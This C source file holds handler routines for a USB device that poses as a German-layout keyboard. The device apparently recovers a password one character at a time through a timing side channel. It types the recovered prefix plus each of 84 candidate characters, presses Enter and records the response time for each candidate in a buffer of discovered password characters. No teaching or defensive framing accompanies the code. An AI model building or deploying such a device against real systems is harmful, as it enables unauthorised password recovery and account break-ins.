#include "handlers.h"
#include "german_keyboardCodes.h"
#include <string.h>

// External declarations for variables defined in main.c
extern volatile uint32_t system_ticks;
extern uint32_t characterResponseTimes[84];
extern char discoveredPasswordBuffer[20];
extern uint8_t awaitingKeyRelease;
extern uint8_t testingCharacterIndex;
extern uint8_t passwordOutputPosition;
extern uint8_t extractedPasswordLength;
extern bool capsLockPhaseFinished;
extern bool shouldSendEnterKey;
extern bool readyForNextCharacter;
extern uint8_t nameCharPosition;
extern bool nameKeyReleased;
extern const char nameString[];

// External function declarations
extern uint8_t GetCharCodeInGerman(char c, uint8_t *modifier);
extern char IndexToChar(uint8_t index);

void ClearReport(USB_KeyboardReport_Data_t *report)
{
	report->Modifier = 0;
	report->Reserved = 0;
	report->KeyCode[0] = 0;
}

void SendEnterKey(USB_KeyboardReport_Data_t *report)
{
	report->Modifier = 0;
	report->Reserved = 0;
	report->KeyCode[0] = 0x28;
}

void SendCharacter(uint8_t charIndex, USB_KeyboardReport_Data_t *report)
{
	char c = IndexToChar(charIndex);
	report->KeyCode[0] = GetCharCodeInGerman(c, &report->Modifier);
}

void HandleCharacterRelease(USB_KeyboardReport_Data_t *report)
{
	ClearReport(report);
	awaitingKeyRelease = 0;
	if (!shouldSendEnterKey)
	{
		readyForNextCharacter = false;
		++testingCharacterIndex;
	}
}

void HandleEnterKeyPress(USB_KeyboardReport_Data_t *report)
{
	SendEnterKey(report);
	shouldSendEnterKey = false;
	characterResponseTimes[testingCharacterIndex] = system_ticks;
	system_ticks = 0;
	awaitingKeyRelease = 1;
}

void HandlePasswordCharSend(USB_KeyboardReport_Data_t *report, bool *isReleased)
{
	if (*isReleased)
	{
		report->Modifier = 0;
		if (passwordOutputPosition == extractedPasswordLength)
		{
			SendCharacter(testingCharacterIndex, report);
			passwordOutputPosition = 0;
			shouldSendEnterKey = true;
			*isReleased = false;
		}
		else
		{
			SendCharacter(discoveredPasswordBuffer[passwordOutputPosition], report);
			passwordOutputPosition++;
			*isReleased = false;
		}
	}
	else
	{
		ClearReport(report);
		*isReleased = true;
	}
}

void HandlePasswordInput(USB_KeyboardReport_Data_t *report, bool *isReleased)
{
	if (testingCharacterIndex < 84 && readyForNextCharacter)
	{
		if (awaitingKeyRelease)
		{
			HandleCharacterRelease(report);
		}
		else if (shouldSendEnterKey)
		{
			HandleEnterKeyPress(report);
		}
		else
		{
			HandlePasswordCharSend(report, isReleased);
		}
	}
	else
	{
		ClearReport(report);
		awaitingKeyRelease = 0;
	}
}

void HandleCapsLockToggle(USB_KeyboardReport_Data_t *report, bool *capsLockPressed)
{
	if (*capsLockPressed)
	{
		ClearReport(report);
		awaitingKeyRelease = 0;
		capsLockPhaseFinished = true;
	}
	else
	{
		report->Modifier = 0;
		report->Reserved = 0;
		report->KeyCode[0] = HID_KEYBOARD_SC_CAPS_LOCK;
		*capsLockPressed = true;
		for (int i = 0; i < 10e5; ++i)
			;
	}
}

void HandleNameOutput(USB_KeyboardReport_Data_t *report)
{
	size_t nameLength = strlen(nameString);

	if (nameCharPosition < nameLength)
	{
		if (nameKeyReleased)
		{
			report->KeyCode[0] = GetCharCodeInGerman(nameString[nameCharPosition], &report->Modifier);
			nameKeyReleased = false;
		}
		else
		{
			ClearReport(report);
			nameKeyReleased = true;
			nameCharPosition++;
		}
	}
	else if (nameCharPosition == nameLength)
	{
		SendEnterKey(report);
		nameCharPosition++;
	}
}
